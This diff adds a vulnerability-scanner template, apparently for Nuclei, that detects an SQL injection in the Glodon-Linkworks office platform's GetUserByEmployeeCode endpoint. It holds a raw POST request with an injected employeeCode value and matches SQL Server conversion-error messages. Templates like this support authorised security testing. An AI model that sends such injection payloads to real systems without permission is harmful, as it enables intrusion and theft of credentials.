@@ -1,0 +1,39 @@
+id: glodon-linkworks-sql-injection
+info:
+  name: Glodon-Linkworks GetUserByEmployeeCode SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Glodon-Linkworks collaborative office management platform's GetUserByEmployeeCode endpoint is vulnerable to SQL Injection, allowing attackers to obtain sensitive information such as usernames and passwords.
+  reference:
+    - https://www.glodon.com/
+  classification:
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 7.5
+  metadata:
+    product: Glodon-Linkworks
+    exploit-ready: true
+  tags: sql-injection
+
+variables:
+  sql: "user"
+
+http:
+  - raw:
+      - |
+        POST /Org/service/Service.asmx/GetUserByEmployeeCode HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 54
+
+        employeeCode=1'-1/{{sql}}--'&EncryptData=1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "在将 nvarchar 值"
+          - "转换成数据类型 int 时失败"
